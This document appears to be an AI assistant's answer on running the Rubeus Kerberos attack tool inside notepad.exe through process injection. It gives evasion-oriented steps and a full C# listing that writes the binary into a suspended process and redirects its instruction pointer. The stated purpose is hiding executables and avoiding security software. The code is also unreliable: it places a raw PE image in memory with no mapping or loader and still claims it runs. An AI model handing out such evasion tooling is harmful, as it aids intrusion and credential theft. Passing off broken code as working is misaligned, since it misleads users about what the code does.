Running an executable like Rubeus through process injection involves injecting the binary of the executable into another process and executing it from within that process. This technique can be useful in various scenarios, such as avoiding detection by security software, hiding the presence of certain executables, or bypassing certain restrictions.

To implement this in C#, you can follow these general steps:

1. **Read the Executable into Memory**: Load the `.exe` file (like Rubeus) into a byte array.
2. **Create a Target Process in a Suspended State**: Create a process where the injection will take place.
3. **Inject the Binary into the Target Process**: Write the binary data into the memory space of the target process.
4. **Set the Entry Point and Resume the Thread**: Modify the entry point to point to the injected code and then resume the process so it executes the injected code.

### Here's how you can do it:

1. **Read the Executable into Memory**:
   - Load the `.exe` file (like Rubeus) into a byte array.

2. **Create a Suspended Process**:
   - Use the `CreateProcess` function to create a target process in a suspended state.

3. **Inject the Binary**:
   - Allocate memory in the target process using `VirtualAllocEx`.
   - Write the binary data to the allocated memory using `WriteProcessMemory`.

4. **Set the Entry Point**:
   - Modify the entry point to point to the injected binary using `GetThreadContext` and `SetThreadContext`.

5. **Resume the Thread**:
   - Resume the process thread using `ResumeThread`.

### Example C# Code:

Below is an example C# code that demonstrates how to inject an executable into another process.

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.System.Memory;
using Windows.Win32.System.Threading;

class Program
{
    static void Main(string[] args)
    {
        // Path to the executable you want to inject (e.g., Rubeus.exe)
        string exePath = @"C:\path\to\Rubeus.exe";
        byte[] exeBytes = File.ReadAllBytes(exePath);

        // Target process (e.g., notepad.exe)
        string targetProcessPath = @"C:\Windows\System32\notepad.exe";

        // Step 1: Create the target process in a suspended state
        PROCESS_INFORMATION pi = default;
        STARTUPINFO si = new STARTUPINFO();
        bool success = PInvoke.CreateProcess(null, targetProcessPath, null, null, false, CREATE_PROCESS.CREATE_SUSPENDED, null, null, si, ref pi);

        if (!success)
        {
            throw new InvalidOperationException("Failed to start the target process.");
        }

        try
        {
            // Step 2: Allocate memory in the target process
            IntPtr remoteBuffer = PInvoke.VirtualAllocEx(pi.hProcess, IntPtr.Zero, (nuint)exeBytes.Length, MEM_ALLOCATION_TYPE.MEM_COMMIT | MEM_ALLOCATION_TYPE.MEM_RESERVE, PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

            if (remoteBuffer == IntPtr.Zero)
            {
                throw new InvalidOperationException("Failed to allocate memory in the target process.");
            }

            // Step 3: Write the executable into the allocated memory
            bool written = PInvoke.WriteProcessMemory(pi.hProcess, remoteBuffer, exeBytes, (nuint)exeBytes.Length, out _);

            if (!written)
            {
                throw new InvalidOperationException("Failed to write the executable into the target process.");
            }

            // Step 4: Get the context of the thread
            CONTEXT context = new CONTEXT();
            context.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;

            if (!PInvoke.GetThreadContext(pi.hThread, ref context))
            {
                throw new InvalidOperationException("Failed to get the thread context.");
            }

            // Step 5: Set the entry point to the injected code
            context.Rip = (ulong)remoteBuffer.ToInt64(); // Set RIP to the start of the injected code (for x64)

            if (!PInvoke.SetThreadContext(pi.hThread, ref context))
            {
                throw new InvalidOperationException("Failed to set the thread context.");
            }

            // Step 6: Resume the thread to execute the injected code
            PInvoke.ResumeThread(pi.hThread);
        }
        finally
        {
            // Clean up handles
            PInvoke.CloseHandle(pi.hProcess);
            PInvoke.CloseHandle(pi.hThread);
        }
    }
}
```

### Key Points:

1. **Reading the Executable**: The binary data of the executable (e.g., Rubeus) is read into a byte array.
2. **Process Creation**: A target process is created in a suspended state using `CreateProcess`.
3. **Memory Allocation and Writing**: Memory is allocated in the target process's space, and the binary data is written into it using `VirtualAllocEx` and `WriteProcessMemory`.
4. **Thread Context Manipulation**: The thread context is manipulated to set the instruction pointer to the start of the injected code using `GetThreadContext` and `SetThreadContext`.
5. **Executing the Injected Code**: The thread is resumed with `ResumeThread`, causing it to execute the injected code.

### Important Considerations:

- **Permissions**: Ensure you have the necessary permissions to inject code into the target process.
- **Security**: This code should only be used in environments where you have explicit permission to perform such actions, such as in controlled penetration testing scenarios.
- **Error Handling**: The code includes basic error handling. You may want to extend this based on your needs.

This code demonstrates a basic example of process injection, specifically tailored for running an executable like Rubeus through a process hollowing technique.